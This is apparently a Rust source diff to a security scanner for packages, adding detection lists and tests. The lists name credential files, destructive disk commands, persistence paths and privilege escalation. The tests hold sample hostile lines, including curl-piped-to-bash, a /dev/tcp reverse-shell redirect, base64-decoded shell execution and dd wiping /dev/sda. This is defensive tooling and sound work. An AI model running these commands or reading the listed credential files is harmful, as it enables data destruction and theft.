@@ -21,6 +21,7 @@ pub enum RuleId {
     CleartextNetworkRequest,
     DirectIpNetworkRequest,
     DisabledTlsVerification,
+    GitConfigCommand,
 }
 
 /// How a rule decides whether a lowercased line matches.
@@ -29,13 +30,24 @@ enum Matcher {
     /// `contains_pattern`).
     Patterns(&'static [&'static str]),
     Custom(fn(&str) -> bool),
-    /// Reported from the network destination inventory instead of per line.
-    NetworkInventory,
+    /// Reported by a dedicated check (the network destination inventory, the
+    /// git config check) instead of per line.
+    Reported,
 }
 
 const CREDENTIAL_FILES: &[&str] = &[
     ".ssh/id_rsa",
     ".ssh/id_ed25519",
+    ".ssh/id_ecdsa",
+    ".ssh/id_dsa",
+    ".gnupg/",
+    ".password-store",
+    ".netrc",
+    ".git-credentials",
+    ".local/share/opencode/auth.json",
+    ".claude/.credentials.json",
+    "logins.json",
+    "key4.db",
     ".aws/credentials",
     ".config/gcloud/credentials.db",
     "/etc/shadow",
@@ -55,6 +67,10 @@ const DESTRUCTIVE_COMMANDS: &[&str] = &[
     "dd if=/dev/zero of=/dev/",
     "dd if=/dev/urandom of=/dev/",
     "--no-preserve-root",
+    "wipefs -a",
+    "wipefs --all",
+    "blkdiscard /dev/",
+    "find / -delete",
 ];
 
 const PERSISTENCE_PATHS: &[&str] = &[
@@ -70,6 +86,16 @@ const PERSISTENCE_PATHS: &[&str] = &[
     ".ssh/authorized_keys",
     ".bashrc",
     ".zshrc",
+    "~/.profile",
+    "$home/.profile",
+    "${home}/.profile",
+    ".bash_profile",
+    ".zprofile",
+    ".config/fish/config.fish",
+    ".config/omarchy/hooks/",
+    "/etc/xdg/autostart/",
+    "/etc/udev/rules.d/",
+    "exec-once",
     "/library/launchagents/",
     "currentversion\\run",
 ];
@@ -85,14 +111,29 @@ const SHELL_EXECUTION: &[&str] = &[
     "command::new(\"sh\")",
     "command::new(\"bash\")",
     "eval(",
+    "os.popen(",
+    "subprocess.call(",
+    "subprocess.check_call(",
+    "subprocess.check_output(",
+    "__import__('os').system(",
+    "__import__(\"os\").system(",
+    "child_process').exec(",
+    "child_process\").exec(",
 ];
 
 const PRIVILEGE_ESCALATION: &[&str] = &[
     "sudo ",
+    "doas ",
+    "run0 ",
     "pkexec ",
     "setuid(",
     "chmod u+s",
     "chmod 4755",
+    "chmod 6755",
+    "chmod +s",
+    "install -m4755",
+    "install -m 4755",
+    "install -dm4755",
     "setcap ",
     "cap_set_file",
     "/etc/sudoers",
@@ -111,7 +152,7 @@ const DISABLED_TLS: &[&str] = &[
 ];
 
 impl RuleId {
-    pub const ALL: [Self; 11] = [
+    pub const ALL: [Self; 12] = [
         Self::DownloadAndExecute,
         Self::EncodedCommandExecution,
         Self::CredentialFileAccess,
@@ -123,6 +164,7 @@ impl RuleId {
         Self::CleartextNetworkRequest,
         Self::DirectIpNetworkRequest,
         Self::DisabledTlsVerification,
+        Self::GitConfigCommand,
     ];
 
     pub const fn name(self) -> &'static str {
@@ -138,6 +180,7 @@ impl RuleId {
             Self::CleartextNetworkRequest => "cleartext-network-request",
             Self::DirectIpNetworkRequest => "direct-ip-network-request",
             Self::DisabledTlsVerification => "disabled-tls-verification",
+            Self::GitConfigCommand => "git-config-command",
         }
     }
 
@@ -153,7 +196,8 @@ impl RuleId {
             | Self::PrivilegeEscalation
             | Self::CleartextNetworkRequest
             | Self::DirectIpNetworkRequest
-            | Self::DisabledTlsVerification => Severity::Medium,
+            | Self::DisabledTlsVerification
+            | Self::GitConfigCommand => Severity::Medium,
         }
     }
 
@@ -190,6 +234,9 @@ impl RuleId {
             Self::DisabledTlsVerification => {
                 "Disables TLS certificate verification for network requests."
             }
+            Self::GitConfigCommand => {
+                "A git config in the tree names a command that git runs on later commands here (status, describe, diff)."
+            }
         }
     }
 
@@ -203,9 +250,9 @@ impl RuleId {
             Self::ShellCommandExecution => Matcher::Patterns(SHELL_EXECUTION),
             Self::PrivilegeEscalation => Matcher::Custom(is_privilege_escalation),
             Self::CredentialExfiltration => Matcher::Custom(looks_like_credential_exfiltration),
-            Self::CleartextNetworkRequest | Self::DirectIpNetworkRequest => {
-                Matcher::NetworkInventory
-            }
+            Self::CleartextNetworkRequest
+            | Self::DirectIpNetworkRequest
+            | Self::GitConfigCommand => Matcher::Reported,
             Self::DisabledTlsVerification => Matcher::Patterns(DISABLED_TLS),
         }
     }
@@ -227,7 +274,8 @@ impl RuleId {
             | Self::EncodedCommandExecution
             | Self::DestructiveSystemOperation
             | Self::ShellCommandExecution
-            | Self::CredentialExfiltration => false,
+            | Self::CredentialExfiltration
+            | Self::GitConfigCommand => false,
         }
     }
 
@@ -235,7 +283,7 @@ impl RuleId {
         match self.matcher() {
             Matcher::Patterns(patterns) => contains_any(lowered, patterns),
             Matcher::Custom(matches) => matches(lowered),
-            Matcher::NetworkInventory => false,
+            Matcher::Reported => false,
         }
     }
 }
@@ -284,7 +332,7 @@ fn is_persistence(line: &str) -> bool {
                 .rfind(char::is_whitespace)
                 .map_or(before, |space| &before[space + 1..])
                 .trim_start_matches(['>', '<', '"', '\'', '(']);
-            let packaged = (word.starts_with("$pkgdir") || word.starts_with("${pkgdir}"))
+            let packaged = is_pkgdir_prefix(word)
                 && !line[start..]
                     .split(char::is_whitespace)
                     .next()
@@ -295,30 +343,106 @@ fn is_persistence(line: &str) -> bool {
     })
 }
 
+/// `$pkgdir` or `${pkgdir}` as a whole word, possibly quoted: `$pkgdirz`
+/// is another (empty) variable, so it does not count.
+fn is_pkgdir_prefix(word: &str) -> bool {
+    let rest = word
+        .strip_prefix("${pkgdir}")
+        .or_else(|| word.strip_prefix("$pkgdir"));
+    rest.is_some_and(|rest| {
+        rest.chars()
+            .next()
+            .is_none_or(|next| !(next.is_ascii_alphanumeric() || next == '_'))
+    })
+}
+
 fn contains_any(haystack: &str, patterns: &[&str]) -> bool {
     patterns
         .iter()
         .any(|pattern| contains_pattern(haystack, pattern))
 }
 
+/// Programs that fetch from the network.
+const FETCHERS: &[&str] = &["curl", "wget", "aria2c"];
+
 pub fn is_download_piped_to_shell(line: &str) -> bool {
-    if !line.contains("curl") && !line.contains("wget") {
+    // Bash's own network redirection: a reverse shell or a fetch without
+    // any fetcher.
+    if line.contains("/dev/tcp/") || line.contains("/dev/udp/") {
+        return true;
+    }
+    if !FETCHERS.iter().any(|fetcher| line.contains(fetcher)) {
         return false;
     }
-    // The shell name may end the command substitution or quoted command it
-    // runs in: `$(curl ... | sh)`, `bash -c "curl ... | sh"`.
-    line.split('|').skip(1).any(|command| {
-        let command = command.trim_start();
-        ["sh", "bash", "zsh"].iter().any(|shell| {
-            command.strip_prefix(shell).is_some_and(|rest| {
-                rest.is_empty() || rest.starts_with([' ', '\t', ')', '`', ';', '&', '"', '\''])
+    pipes_into_shell(line, |segment| {
+        FETCHERS
+            .iter()
+            .any(|fetcher| contains_pattern(segment, fetcher))
+    }) || runs_fetched_text(line)
+}
+
+/// A shell reading a fetch through process substitution (`sh <(curl …)`,
+/// `source <(curl …)`) or running a command substitution of one
+/// (`bash -c "$(curl …)"`, `eval "$(curl …)"`).
+fn runs_fetched_text(line: &str) -> bool {
+    let substituted = FETCHERS.iter().any(|fetcher| {
+        ["<(", "$(", "`"].iter().any(|open| {
+            line.contains(&format!("{open}{fetcher}"))
+                || line.contains(&format!("{open} {fetcher}"))
+        })
+    });
+    substituted
+        && (line.contains("<(")
+            || ["sh -c", "bash -c", "zsh -c", "eval "]
+                .iter()
+                .any(|runner| contains_pattern(line, runner)))
+}
+
+/// Whether a pipeline segment for which `source` holds is followed, later in
+/// the pipeline, by a shell reading it: `| sh`, `| sudo bash`, `|/bin/sh`,
+/// `| env bash`.
+fn pipes_into_shell(line: &str, source: impl Fn(&str) -> bool) -> bool {
+    // `a || b` runs b instead of a, not on its output.
+    let line = line.replace("||", ";");
+    let segments: Vec<&str> = line.split('|').collect();
+    let Some(first) = segments.iter().position(|segment| source(segment)) else {
+        return false;
+    };
+    segments[first + 1..].iter().any(|command| {
+        let mut words = command.split_whitespace();
+        let mut word = words.next().unwrap_or_default();
+        while matches!(word, "sudo" | "doas" | "run0" | "env" | "command" | "exec")
+            || word.starts_with('-')
+        {
+            word = words.next().unwrap_or_default();
+        }
+        let program = word
+            .trim_start_matches(['(', '"', '\''])
+            .rsplit('/')
+            .next()
+            .unwrap_or_default();
+        ["sh", "bash", "zsh", "dash"].iter().any(|shell| {
+            program.strip_prefix(shell).is_some_and(|rest| {
+                rest.is_empty() || rest.starts_with([')', '`', ';', '&', '"', '\''])
             })
         })
     })
 }
 
 fn is_encoded_command_execution(line: &str) -> bool {
-    contains_any(line, ENCODED_PIPES) || is_encoded_data_executed(line)
+    contains_any(line, ENCODED_PIPES)
+        || pipes_into_shell(line, |segment| {
+            [
+                "base64 -d",
+                "base64 --decode",
+                "xxd -r",
+                "openssl base64 -d",
+                "openssl enc -d",
+            ]
+            .iter()
+            .any(|decoder| segment.contains(decoder))
+        })
+        || is_encoded_data_executed(line)
 }
 
 pub fn is_encoded_data_executed(line: &str) -> bool {
@@ -383,8 +507,27 @@ fn without_sandbox_helper_setuid(line: &str) -> Option<String> {
 
 fn is_destructive_operation(line: &str) -> bool {
     contains_any(line, DESTRUCTIVE_COMMANDS)
+        || writes_a_device(line)
         || formats_filesystem(line)
         || removes_root_or_home(line)
+}
+
+/// `dd` writing to a block device, in either argument order.
+fn writes_a_device(line: &str) -> bool {
+    let words: Vec<String> = shell_words(line)
+        .iter()
+        .map(|word| unquoted(word))
+        .collect();
+    words
+        .iter()
+        .any(|word| word == "dd" || word.ends_with("/dd"))
+        && words.iter().any(|word| {
+            word.strip_prefix("of=/dev/").is_some_and(|device| {
+                !matches!(device, "null" | "stdout" | "stderr" | "zero")
+                    && !device.starts_with("fd/")
+                    && !device.starts_with("shm/")
+            })
+        })
 }
 
 /// Commands that only handle a file by name, so a `mkfs.*` argument is a
@@ -867,6 +1010,79 @@ mod tests {
     fn rules_for(line: &str) -> Vec<RuleId> {
         let lowered = line.to_lowercase();
         line_rules(&lowered, &lowered).collect()
+    }
+
+    #[test]
+    fn common_variants_of_each_rule_are_caught() {
+        let cases: &[(&str, RuleId)] = &[
+            (
+                "curl -fsSL https://x.test/i | sudo bash",
+                RuleId::DownloadAndExecute,
+            ),
+            (
+                "curl -fsSL https://x.test/i |/bin/sh",
+                RuleId::DownloadAndExecute,
+            ),
+            ("sh <(curl -s https://x.test/i)", RuleId::DownloadAndExecute),
+            (
+                "bash -c \"$(wget -qO- https://x.test/i)\"",
+                RuleId::DownloadAndExecute,
+            ),
+            (
+                "aria2c -o - https://x.test/i | sh",
+                RuleId::DownloadAndExecute,
+            ),
+            ("exec 3<>/dev/tcp/10.0.0.1/4444", RuleId::DownloadAndExecute),
+            ("echo aGk= | base64 -d|sh", RuleId::EncodedCommandExecution),
+            (
+                "echo aGk= | base64 -di | sudo bash",
+                RuleId::EncodedCommandExecution,
+            ),
+            ("xxd -r -p payload | bash", RuleId::EncodedCommandExecution),
+            ("doas pacman -U x", RuleId::PrivilegeEscalation),
+            ("run0 systemctl enable x", RuleId::PrivilegeEscalation),
+            ("chmod +s /usr/bin/x", RuleId::PrivilegeEscalation),
+            ("install -m4755 x /usr/bin/x", RuleId::PrivilegeEscalation),
+            ("cat ~/.git-credentials", RuleId::CredentialFileAccess),
+            ("tar c ~/.password-store", RuleId::CredentialFileAccess),
+            ("exec-once = ~/.cache/x", RuleId::PersistenceModification),
+            (
+                "cp x ~/.config/omarchy/hooks/post-update",
+                RuleId::PersistenceModification,
+            ),
+            (
+                "cp p $pkgdirZ$HOME/.config/autostart/x.desktop",
+                RuleId::PersistenceModification,
+            ),
+            (
+                "dd of=/dev/sda if=/dev/zero",
+                RuleId::DestructiveSystemOperation,
+            ),
+            ("wipefs -a /dev/nvme0n1", RuleId::DestructiveSystemOperation),
+            (
+                "__import__('os').system('id')",
+                RuleId::ShellCommandExecution,
+            ),
+            (
+                "subprocess.check_output(cmd, shell=True)",
+                RuleId::ShellCommandExecution,
+            ),
+        ];
+        for (line, rule) in cases {
+            assert!(
+                rules_for(line).contains(rule),
+                "{line}: {:?}",
+                rules_for(line)
+            );
+        }
+        for line in [
+            "install -Dm644 x.desktop \"$pkgdir\"/etc/xdg/autostart/x.desktop",
+            "cp x ${pkgdir}/etc/profile.d/x.sh",
+            "curl -fsSL https://x.test/a || sh fallback.sh",
+            "dd if=image.iso of=/dev/null",
+        ] {
+            assert!(rules_for(line).is_empty(), "{line}: {:?}", rules_for(line));
+        }
     }
 
     #[test]
